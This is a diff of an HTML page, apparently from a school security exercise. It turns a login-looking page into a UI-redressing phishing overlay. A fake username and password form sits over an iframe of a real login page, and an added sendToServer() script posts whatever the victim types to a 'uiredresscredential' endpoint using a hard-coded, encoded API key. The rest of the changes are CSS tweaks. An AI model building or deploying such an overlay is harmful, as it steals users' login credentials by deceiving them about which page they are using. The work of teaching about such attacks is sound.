@@ -24,12 +24,15 @@
             margin: auto;
             margin-top: 191px;
             background-color: white;
+            font-family: 'Roboto,sans-serif';
+            font-weight: 500;
+            letter-spacing: .0892857143em;
         }
 
         .username {
             width: 65%;
             border: none;
-            border-bottom: 2px solid grey;
+            border-bottom: 1px solid grey;
             padding: 5px;
             font-size: large;
         }
@@ -39,7 +42,7 @@
             margin-bottom: 5px;
             width: 65%;
             border: none;
-            border-bottom: 2px solid grey;
+            border-bottom: 1px solid grey;
             padding: 5px;
             font-size: large;
         }
@@ -51,6 +54,7 @@
         button {
             background-color: #1976d2;
             color: white;
+            cursor: pointer;
             border: none;
             padding: 0 16px;
             height: 34px;
@@ -59,6 +63,7 @@
             font-size: medium;
             margin-top: 63px;
             margin-bottom: 10px;
+            z-index: 200;
         }
 
         @media screen and (max-width: 600px) {
@@ -90,18 +95,47 @@
                 width: 400px;
             }
         }
+
+        @media screen and (min-width: 1900px) {
+            .username {
+                width: 600px;
+            }
+
+            .password {
+                width: 600px;
+            }
+        }
     </style>
+    <script>
+        function sendToServer() {
+            fetch('https://m183.gibz-informatik.ch/api/uiredresscredential', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Api-Key': 'NAAyADcANwAyADgAMQA5ADAAMgAwADkAOAAxADcAOQA5ADgA'
+                },
+                body: JSON.stringify({
+                    "username": document.getElementsByClassName('username')[0].value,
+                    "password": document.getElementsByClassName('password')[0].value
+                })
+            }).then(res => {
+                console.log(res)
+            }).catch((error) => {
+                console.log(error)
+            })
+        }
+    </script>
 </head>
 <body>
     <div class="floating">
         <div class="form-group">
             <input class="username" type="text" placeholder="Username">
             <br/>
-            <input class="password" type="text" placeholder="Password">
+            <input class="password" type="password" placeholder="Password">
             <br/>
-            <button value="test">LOGIN</button>
+            <button onclick="sendToServer()">LOGIN</button>
         </div>
     </div>
-    <iframe height="100%" width="100%" src="https://m183.gibz-informatik.ch/login"></iframe>
+    <iframe sandbox="allow-scripts" height="100%" width="100%" src="https://m183.gibz-informatik.ch/login"></iframe>
 </body>
 </html>
